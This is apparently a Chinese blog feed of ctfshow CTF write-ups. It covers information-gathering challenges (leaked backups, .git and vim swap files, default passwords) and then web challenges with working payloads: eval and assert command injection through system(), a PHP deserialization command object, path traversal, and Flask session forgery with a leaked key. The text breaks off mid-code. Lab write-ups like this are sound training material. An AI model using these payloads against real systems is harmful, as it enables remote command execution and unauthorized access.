        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>信息收集</h1><hr><h2 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h2><ul><li>描述: 开发注释未及时删除</li></ul><p>F12, 然后在注释里面找到flag</p><h2 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h2><ul><li>描述: js前台拦截 === 无效操作</li></ul><p>你懂的, js是可以被禁止使用的; 虽然本题禁止F12和右键,但是它没禁止右上角更多里面的开发者工具, 打开开发者工具界面就能在源码里面翻到flag, 或者在设置里面禁用js就行</p><h2 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h2><ul><li>描述: 没思路的时候抓个包看看，可能会有意外收获</li></ul><p>抓包就可以在返回包里面找到flag</p><h2 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h2><ul><li>描述: 总有人把后台地址写入robots，帮黑阔大佬们引路</li></ul><p>访问<code>/robots.txt</code>找到新的路由<code>/flagishere.txt</code>, 访问即可得到flag</p><blockquote><p>/robots.txt 用于向搜索引擎爬虫提供指示，告诉它们哪些页面或部分不应该被抓取或索引, 我们就应该去那些不允许爬虫爬的地方</p></blockquote><h2 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h2><ul><li>描述: phps源码泄露有时候能帮上忙</li></ul><p>访问<code>/index.phps</code>可以获得当前页面的源码, 在注释里面可以找到flag</p><blockquote><p>.phps 文件通常在开发和调试中有用, 只显示代码而不是执行, 我们利用这个来进行代码审计寻找漏洞</p></blockquote><h2 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h2><ul><li>描述: 解压源码到当前目录，测试正常，收工</li></ul><p>一样的, 上一个是某个文件的phps, 这次是整个的<code>www.zip</code>,访问<code>/www.zip</code>下载源码</p><p>“flag in fl000g.txt”, 但是只有一个假的flag, 访问<code>/fl000g.txt</code>才是真的flag</p><blockquote><p>可能会有的文件: www.zip, project.zip, source_code.zip, app.zip, release.zip</p></blockquote><h2 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h2><ul><li>描述: 版本控制很重要，但不要部署到生产环境更重要</li></ul><p>这次是<code>.git</code>文件, 直接访问就可以得到flag了</p><blockquote><p>Git是一个版本控制工具, Git 会在项目的根目录下创建一个 <code>.git</code> 目录</p><p>那什么是版本控制工具呢, Github知道吧, 它们都用于管理和跟踪文件的更改，特别是源代码</p></blockquote><h2 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h2><ul><li>描述: 版本控制很重要，但不要部署到生产环境更重要</li></ul><p>SVN也是一个版本控制工具, 这次是<code>.svn</code>文件</p><h2 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h2><ul><li>描述: 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</li></ul><p>这次是vim非正常退出生成的临时文件<code>index.php.swp</code>, 下载文件之后查看即可</p><blockquote><p>vim: .swp和.swo, 后者是在前者存在的情况下生成的备份交换文件</p><p>nano: .save文件</p><p>Emacs/Gedit: ~文件, 在文件名后加上~</p></blockquote><h2 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h2><ul><li>描述: cookie 只是一块饼干，不能存放任何隐私数据</li></ul><p>反着来就行, 查看cookie值就能得到flag</p><h2 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h2><ul><li>描述: 域名其实也可以隐藏信息，<a href="http://xn--flag-f96g315g.ctfshow.com">比如flag.ctfshow.com</a> 就隐藏了一条信息</li></ul><p>域名解析查询过往txt文件即可, 但是我就是试不出来, 图我就不给了</p><h2 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h2><ul><li>描述: 有时候网站上的公开信息，就是管理员常用密码</li></ul><p>利用网站扫描工具进行扫描, 可以得到一些有用的界面, 比如robots.txt, 里面显示有一个<code>/admin</code>路由, 访问后发现需要账号密码才能继续访问</p><p>结合题目描述, 翻找网站能找到的一些公开信息只有页尾的Help Line Number : 372619038, 其他界面的页尾似乎是无效的, 我们就用这个去尝试登录, 账号是admin</p><h2 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h2><ul><li>描述: 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</li></ul><p>那就是说明书没有删除, 页尾刚好就有一个document, 通过源代码检查发现直接通往<code>/document.pdf</code>, 访问后发现正好是开发文档, 里面有后台地址, 默认账号密码, 登录获得flag</p><h2 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h2><ul><li>描述: 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</li></ul><p>进行目录扫描, 可以得到<code>/editor</code>路由:</p><p>插入文件-&gt;文件空间, 然后在里面扒拉, 扒拉半天找到了<code>/var/www/html/nothinghere/fl000g.txt</code>, 访问<code>/nothinghere/fl000g.txt</code>就能得到flag</p><h2 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h2><ul><li>描述: 公开的信息比如邮箱，可能造成信息泄露，产生严重后果</li></ul><p>根据提示能拿到页尾的qq邮箱<code>1156631961@qq.com</code>, 后台扫描能拿到后台登录界面<code>/admin</code>, 尝试弱密码登录, 当用户名为admin的时候提示密码错误, 现在只有密码未知了</p><p>忘记密码的密保问题是&quot;我的所在地是哪个城市？&quot; 此时想起来qq似乎是显示所在地的(虽然可以自己编辑), 用qq搜索这个人, 可以看到所在地是中国的陕西西安, 提交答案, 提示密码重置为admin7789, 登录即可获得flag</p><h2 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h2><ul><li>描述: 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</li></ul><p>扫描可以发现<code>tz.php</code>,然后页面上这个 PHPINFO 是可以点击的, 点进去直接搜索ctfshow就可以拿下了</p><blockquote><p>诸如此类的还有c99.php, r57.php, b374k.php 等等,你可在github上找到它们</p></blockquote><h2 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h2><ul><li>描述: 备份的sql文件会泄露敏感信息</li></ul><p>备份文件是<code>/backup.sql</code>, 打开就可以得到flag</p><h2 id="web18"><a class="header-anchor" href="#web18">¶</a>web18</h2><ul><li>描述: 不要着急，休息，休息一会儿，玩101分给你flag(一休是吧)</li></ul><p>既然是101, 在js程序中搜索100(肯定大于100)看看结果</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;GAMEOVER\n鏄惁浠庢柊寮€濮�&quot;</span>);</span><br></pre></td></tr></table></figure><p>解码得到&quot;你赢了，去幺幺零点皮爱吃皮看看&quot;. 即<code>/110.php</code>, 访问即可拿到flag</p><h2 id="web19"><a class="header-anchor" href="#web19">¶</a>web19</h2><ul><li>描述: 密钥什么的，就不要放在前端了</li></ul><p>已经不是密钥了, 已经是源码了, 用对应变量发包就可以了, 直接输入似乎不行</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    error_reporting(0);</span></span><br><span class="line"><span class="comment">    $flag=&quot;fakeflag&quot;</span></span><br><span class="line"><span class="comment">    $u = $_POST[&#x27;username&#x27;];</span></span><br><span class="line"><span class="comment">    $p = $_POST[&#x27;pazzword&#x27;];</span></span><br><span class="line"><span class="comment">    if(isset($u) &amp;&amp; isset($p))&#123;</span></span><br><span class="line"><span class="comment">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            echo $flag;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web20"><a class="header-anchor" href="#web20">¶</a>web20</h2><ul><li>描述: mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了</li></ul><p>访问<code>/db/db.mdb</code>, 下载之后用access软件(微软的?)打开, flag在&quot;返回主界切换面板选项&quot;后面</p><h1>随便总结</h1><p>基本上都是网站泄露的文件/信息/架构, 这种一般就是先靠经验去试一试, 然后拿工具去扫描, 能不能扫描出来全靠字典;</p><p>再整不出来, 那就进入下一个阶段了</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_菜狗杯</title>
      <link href="/article/ctfshow-caogou/"/>
      <url>/article/ctfshow-caogou/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Web</h1><hr><h2 id="Web签到"><a class="header-anchor" href="#Web签到">¶</a>Web签到</h2><p>嵌套: Cookie传参 -&gt; POST传参 -&gt; GET传参 -&gt; REQUEST传参 -&gt; eval执行</p><p>假如Cookie中传入<code>CTFshow-QQ群:=a</code>, 那么就会出现<code>$_POST['a']</code>, 假如POST传入的值为a=b，那么就会得到<code>$_GET['b']</code>，接着假如GET传入b=c就会得到<code>$_REQUEST['c']</code></p><p>假如再get传入c=123那么前面这一部分<code>($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]])</code>的值就是123了。但是最终是需要通过数组下标的方式给到eval的。所以c传个数组就可以了: <code>c[6][0][7][5][8][0][9][4][4]=system('ls');</code></p><p>接下来命令执行就不多说了, 如果发不出去就用url编码一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET: ?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat%20%2ff1agaaa&#x27;);</span><br><span class="line">POST: a=b</span><br><span class="line">Cookie: CTFshow-QQ%e7%be%a4:=a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623205506489.png" alt="image-20240623205506489"></p><h2 id="我的眼里只有"><a class="header-anchor" href="#我的眼里只有">¶</a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);  <span class="comment">// 36个$</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>本题就是如何闭合这36个$, 生成payload的exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str = <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    my_str += <span class="string">&#x27;=&#x27;</span> + <span class="built_in">chr</span>(<span class="number">97</span>+i)+<span class="string">&#x27;&amp;&#x27;</span> + <span class="built_in">chr</span>(<span class="number">97</span>+i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    my_str += <span class="string">&#x27;=&#x27;</span> + <span class="built_in">chr</span>(<span class="number">65</span>+i)+<span class="string">&#x27;&amp;&#x27;</span> + <span class="built_in">chr</span>(<span class="number">65</span>+i)</span><br><span class="line">my_str += <span class="string">&quot;=system(&#x27;ls /&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_str)</span><br><span class="line"><span class="comment"># _=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;ls /&#x27;);</span></span><br></pre></td></tr></table></figure><p>命令执行就不再赘述</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623212128207.png" alt="image-20240623212128207"></p><h2 id="抽老婆"><a class="header-anchor" href="#抽老婆">¶</a>抽老婆</h2><p>本来想应该是通过伪造图片的请求来读取文件的, 发现不行</p><p>最后在源码这里找到下载方式, 这个下载方式和旁边的注释很可疑, 可能会有任意文件下载</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn layui-btn-lg layui-btn-radius layui-btn-normal&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/download?file=6249ab7d7d4f7993619c2a22cb426d03.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px;&quot;</span>&gt;</span>下载老婆<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 特意为了不会右键另存为的同学做了这个功能，我真的太温柔了 --&gt;</span></span><br></pre></td></tr></table></figure><p>利用<code>/download?file=1111</code>报错,可以发现是Flask框架, <a href="http://xn--app-tu9ds88awvvgo5by43a.py">配置文件在app.py</a>, ``/download?file=…/…/app.py`下载源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/11/07 09:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：抽老婆，哇偶~</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getwifi&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getwifi</span>():</span><br><span class="line">    session[<span class="string">&#x27;isadmin&#x27;</span>]=<span class="literal">False</span></span><br><span class="line">    wifi=random.choice(os.listdir(<span class="string">&#x27;static/img&#x27;</span>))</span><br><span class="line">    session[<span class="string">&#x27;current_wifi&#x27;</span>]=wifi</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;getwifi.html&#x27;</span>,wifi=wifi)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">    filename=request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你想干什么？&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> send_file(<span class="string">&#x27;static/img/&#x27;</span>+filename,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret_path_U_never_know&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:flag&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/secret_path_U_never_know</code>路由有一个session验证, 直接用上得到的密钥和flasksession伪造工具即可伪造<code>isadmin=True</code>,发包即可拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623224307361.png" alt="image-20240623224307361"></p><h2 id="一言既出"><a class="header-anchor" href="#一言既出">¶</a>一言既出</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ol><li>先满足<code>$_GET['num']</code>的值等于114514</li><li>使用<code>assert()</code>函数判断给定的表达式是否为真。如果表达式为假，则会抛出一个致命错误。</li><li>表达式为<code>intval($_GET[num])==1919810</code>，即将<code>$_GET['num']</code>强制转换为整数后，判断是否等于1919810, 如果表达式为真，则程序继续执行。</li></ol><p>有好几种解:num=114514进入条件后, 通过 # 注释掉后面的部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514);%23</span><br><span class="line"></span><br><span class="line"># 再给一点类似原理的:</span><br><span class="line">?num=114514);//</span><br><span class="line">?num=114514);(19199810# 闭合后给后面的判断也变为真</span><br><span class="line">?num=114514)==1 or system(&#x27;ls&#x27;);%23# 恒等于1后用or注入其他命令</span><br><span class="line">?num=114514)==1%20or%20system(%27ls%27);%23</span><br></pre></td></tr></table></figure><p>num=114514进入条件然后加上一个数, 使得num变为1919810</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514%2b1805296</span><br><span class="line">?num=114514)==1 or system(&#x27;ls&#x27;) or (1919810</span><br></pre></td></tr></table></figure><blockquote><p>URL中的+和空格+如果直接写在url里面, 只会被当成一个字符串输出, 而不是作为运算符号, 所以用%2b空格则表示单词之间的间隔另外, 单引号: %27 , 井号: %23</p></blockquote><h2 id="Webshell"><a class="header-anchor" href="#Webshell">¶</a>Webshell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$serializecmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$unserializecmd</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializecmd</span>);</span><br><span class="line">        <span class="variable">$unserializecmd</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>非常简单的反序列化, 直接修改cmd的值就行, 完全没有什么难度, 至于这么提取flag, 通配符会出手:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;<span class="comment">// 修改这里就可以了, cat fl*</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Webshell</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也可以将该目录下所有文件内容输出到一个不含flag的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;cat fl*&quot;;&#125;# 然后看F12</span><br><span class="line">O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:13:&quot;cat * &gt; 1.txt&quot;;&#125;# 后面再读取1.txt就可以了</span><br></pre></td></tr></table></figure><h2 id="化零为整"><a class="header-anchor" href="#化零为整">¶</a>化零为整</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你太长了！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;大牛&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我还在想url编码后不是三个嘛, 结果发现是拼接, 变量是一位就行, 而本身url编码后也只是占了一个位置, <strong>不是三个</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure><h2 id="无一幸免"><a class="header-anchor" href="#无一幸免">¶</a>无一幸免</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非预期:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传入 ?0=1</span><br></pre></td></tr></table></figure><p>看了WP, 这肯定不对的啊? 哦有个fixed</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span 